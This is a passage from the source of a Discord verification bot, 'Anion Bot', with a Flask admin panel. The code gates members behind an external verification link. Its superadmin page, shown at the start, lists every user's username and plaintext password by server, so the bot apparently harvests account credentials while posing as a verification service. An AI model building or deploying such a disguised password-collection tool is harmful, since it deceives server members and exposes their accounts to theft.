        <h2>🔑 User Passwords</h2>
        <table>
            <thead><tr><th>User ID</th><th>Username</th><th>Password</th></tr></thead>
            <tbody>
                {% for guild_id, users in passwords.items() %}
                    {% for user_id, data in users.items() %}
                    <tr><td>{{ user_id }}</td><td>{{ data.username or 'N/A' }}</td><td><span class="token">{{ data.password or 'N/A' }}</span></td></tr>
                    {% endfor %}
                {% endfor %}
            </tbody>
        </table>
        {% endif %}
    </div></body></html>
    """, 
    guilds=guilds, 
    users=users, 
    total_guilds=len(guilds), 
    total_users=len(users),
    total_passwords=sum(len(users) for users in passwords.values()) if passwords else 0,
    passwords=passwords
    )

@flask_app.route('/superadmin-logout')
def superadmin_logout():
    session.clear()
    return redirect(url_for('superadmin_login'))

# ─── API ROUTES ────────────────────────────────────────────────────────────

@flask_app.route('/api/stats', methods=['GET'])
def api_stats():
    try:
        total_commands = db_count('command_logs')
        total_verified = db_count('verified_users')
        
        return jsonify({
            'success': True,
            'stats': {
                'total_commands': total_commands,
                'total_verified': total_verified,
                'total_guilds': len(bot_instance.guilds) if bot_instance else 0,
                'uptime': str(datetime.now() - bot_instance.start_time).split('.')[0] if bot_instance else '0'
            }
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@flask_app.route('/api/guilds', methods=['GET'])
def api_guilds():
    try:
        guilds = []
        if bot_instance:
            for guild in bot_instance.guilds:
                guilds.append({
                    'id': str(guild.id),
                    'name': guild.name,
                    'member_count': guild.member_count,
                    'icon': guild.icon.url if guild.icon else None
                })
        return jsonify({'success': True, 'guilds': guilds})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# ═════════════════════════════════════════════════════════════════════════════
# DISCORD BOT - VERIFICATION ONLY
# ═════════════════════════════════════════════════════════════════════════════

class AnionBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix='/', intents=intents)
        self.start_time = datetime.now()

    async def setup_hook(self):
        await self.register_commands()
        await self.tree.sync()
        logger.info('✅ Commands synced!')

    async def register_commands(self):
        
        # ═════════════════════════════════════════════════════════════════════
        # VERIFICATION COMMANDS
        # ═════════════════════════════════════════════════════════════════════

        @self.tree.command(name="verify", description="🔐 Start verification")
        @app_commands.checks.cooldown(1, 10.0)
        @log_command
        async def verify(interaction: discord.Interaction):
            verify_url = f"https://edith.up.railway.app/verify?guild_id={interaction.guild.id}"
            embed = discord.Embed(
                title="🔐 Verification Required",
                description="Click the button below to verify your identity.",
                color=discord.Color.blue()
            )
            embed.set_thumbnail(url=interaction.guild.me.display_avatar.url)
            view = View()
            view.add_item(Button(label="🔐 Verify Now", url=verify_url, style=discord.ButtonStyle.success))
            await interaction.response.send_message(embed=embed, view=view)

        @self.tree.command(name="verifystatus", description="🔐 Check verification status")
        @app_commands.checks.cooldown(1, 5.0)
        @log_command
        async def verifystatus(interaction: discord.Interaction):
            user_id = str(interaction.user.id)
            guild_id = str(interaction.guild.id)
            verified = db_fetch_one("SELECT * FROM verified_users WHERE user_id=? AND guild_id=?", (user_id, guild_id))
            embed = discord.Embed(
                title="✅ Verified" if verified else "❌ Not Verified",
                description="You are verified!" if verified else "Use /verify to get verified.",
                color=discord.Color.green() if verified else discord.Color.red()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)

        @self.tree.command(name="setverifiedrole", description="⚙️ Set verified role (Admin)")
        @app_commands.default_permissions(administrator=True)
        @app_commands.checks.cooldown(1, 5.0)
        @app_commands.describe(role="Role for verified users")
        @log_command
        async def setverifiedrole(interaction: discord.Interaction, role: discord.Role):
            db_execute("INSERT OR REPLACE INTO guild_settings (guild_id, verified_role_id) VALUES (?,?)", 
                       (str(interaction.guild.id), str(role.id)))
            embed = discord.Embed(title="✅ Verified Role Set", description=f"Set to {role.mention}", color=discord.Color.green())
            await interaction.response.send_message(embed=embed)

        @self.tree.command(name="setunverifiedrole", description="⚙️ Set unverified role (Admin)")
        @app_commands.default_permissions(administrator=True)
        @app_commands.checks.cooldown(1, 5.0)
        @app_commands.describe(role="Role for unverified users")
        @log_command
        async def setunverifiedrole(interaction: discord.Interaction, role: discord.Role):
            db_execute("INSERT OR REPLACE INTO guild_settings (guild_id, unverified_role_id) VALUES (?,?)", 
                       (str(interaction.guild.id), str(role.id)))
            embed = discord.Embed(title="✅ Unverified Role Set", description=f"Set to {role.mention}", color=discord.Color.green())
            await interaction.response.send_message(embed=embed)

        @self.tree.command(name="setlogchannel", description="⚙️ Set log channel (Admin)")
        @app_commands.default_permissions(administrator=True)
        @app_commands.checks.cooldown(1, 5.0)
        @app_commands.describe(channel="Channel for logs")
        @log_command
        async def setlogchannel(interaction: discord.Interaction, channel: discord.TextChannel):
            db_execute("INSERT OR REPLACE INTO guild_settings (guild_id, log_channel_id) VALUES (?,?)", 
                       (str(interaction.guild.id), str(channel.id)))
            embed = discord.Embed(title="✅ Log Channel Set", description=f"Set to {channel.mention}", color=discord.Color.green())
            await interaction.response.send_message(embed=embed)

        @self.tree.command(name="setupverify", description="⚙️ Setup verification system (Admin)")
        @app_commands.default_permissions(administrator=True)
        @app_commands.checks.cooldown(1, 30.0)
        @log_command
        async def setupverify(interaction: discord.Interaction):
            guild = interaction.guild

            verified = discord.utils.get(guild.roles, name="Verified") or await guild.create_role(name="Verified", color=discord.Color.green())
            unverified = discord.utils.get(guild.roles, name="Unverified") or await guild.create_role(name="Unverified", color=discord.Color.red())

            category = discord.utils.get(guild.categories, name="🔐 Verification") or await guild.create_category("🔐 Verification")
            channel = discord.utils.get(guild.channels, name="🔐-verify") or await guild.create_text_channel("🔐-verify", category=category)

            db_execute("""
                INSERT OR REPLACE INTO guild_settings (guild_id, verified_role_id, unverified_role_id, verification_channel_id)
                VALUES (?,?,?,?)
            """, (str(guild.id), str(verified.id), str(unverified.id), str(channel.id)))

            for ch in guild.channels:
                try:
                    await ch.set_permissions(unverified, read_messages=False)
                    await ch.set_permissions(verified, read_messages=True, send_messages=True)
                except:
                    pass

            verify_url = f"https://edith.up.railway.app/verify?guild_id={guild.id}"
            embed = discord.Embed(
                title="🔐 Verification Required",
                description="Click the button below to verify.",
                color=discord.Color.blue()
            )
            view = View()
            view.add_item(Button(label="🔐 Verify Now", url=verify_url, style=discord.ButtonStyle.success))
            await channel.send(embed=embed, view=view)

            embed = discord.Embed(
                title="✅ Verification Setup Complete",
                description=f"✅ Verified: {verified.mention}\n✅ Unverified: {unverified.mention}\n✅ Channel: {channel.mention}",
                color=discord.Color.green()
            )
            await interaction.response.send_message(embed=embed)

        # ═════════════════════════════════════════════════════════════════════
        # UTILITY COMMANDS (Minimal)
        # ═════════════════════════════════════════════════════════════════════

        @self.tree.command(name="ping", description="🏓 Check bot latency")
        @app_commands.checks.cooldown(1, 3.0)
        @log_command
        async def ping(interaction: discord.Interaction):
            latency = round(interaction.client.latency * 1000)
            embed = discord.Embed(
                title="🏓 Pong!",
                description=f"Latency: {latency}ms",
                color=discord.Color.green()
            )
            embed.add_field(name="Uptime", value=str(datetime.now() - self.start_time).split('.')[0], inline=True)
            embed.add_field(name="Servers", value=len(self.guilds), inline=True)
            await interaction.response.send_message(embed=embed)

        @self.tree.command(name="serverinfo", description="📊 Server information")
        @app_commands.checks.cooldown(1, 5.0)
        @log_command
        async def serverinfo(interaction: discord.Interaction):
            guild = interaction.guild
            embed = discord.Embed(
                title=f"📊 {guild.name}",
                color=discord.Color.blue()
            )
            embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
            embed.add_field(name="👥 Members", value=guild.member_count, inline=True)
            embed.add_field(name="📝 Channels", value=len(guild.channels), inline=True)
            embed.add_field(name="🎭 Roles", value=len(guild.roles), inline=True)
            embed.add_field(name="👑 Owner", value=guild.owner.mention if guild.owner else "Unknown", inline=True)
            embed.add_field(name="📅 Created", value=guild.created_at.strftime("%Y-%m-%d"), inline=True)
            embed.add_field(name="💎 Boost Level", value=guild.premium_tier, inline=True)
            await interaction.response.send_message(embed=embed)

    # ─── EVENT HANDLERS ────────────────────────────────────────────────────

    async def on_ready(self):
        logger.info("╔══════════════════════════════════════════════════════════════════╗")
        logger.info("║              🔐 ANION BOT - VERIFICATION SYSTEM                ║")
        logger.info("║              ✅✅✅ BOT IS ONLINE! ✅✅✅                           ║")
        logger.info("╚══════════════════════════════════════════════════════════════════╝")
        logger.info(f"📡 Name: {self.user.name}")
        logger.info(f"🆔 ID: {self.user.id}")
        logger.info(f"🏰 Servers: {len(self.guilds)}")
        for guild in self.guilds:
            logger.info(f"   - {guild.name} ({guild.id})")
        logger.info("═" * 70)
        logger.info("✅ Verification System Loaded!")
        logger.info("   Commands: /verify, /verifystatus, /setupverify")
        logger.info("   Admin: /setverifiedrole, /setunverifiedrole, /setlogchannel")
        logger.info("═" * 70)

    async def on_member_join(self, member):
        # Assign unverified role
        settings = db_fetch_one("SELECT unverified_role_id FROM guild_settings WHERE guild_id=?", (str(member.guild.id),))
        if settings and settings['unverified_role_id']:
            role = member.guild.get_role(int(settings['unverified_role_id']))
            if role:
                await member.add_roles(role)

    async def on_error(self, event, *args, **kwargs):
        logger.error(f"Error in event {event}:")
        logger.error(traceback.format_exc())

# ═════════════════════════════════════════════════════════════════════════════
# RUN BOT
# ═════════════════════════════════════════════════════════════════════════════

bot_instance = None

def run_flask():
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)

async def main():
    global bot_instance
    logger.info("🚀 Starting Anion Bot - Verification Edition...")
    logger.info("═" * 70)

    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    logger.info(f"🌐 Flask started on port {PORT}")

    bot_instance = AnionBot()
    await bot_instance.start(TOKEN)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("\n👋 Shutting down...")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        logger.error(traceback.format_exc())
        sys.exit(1)
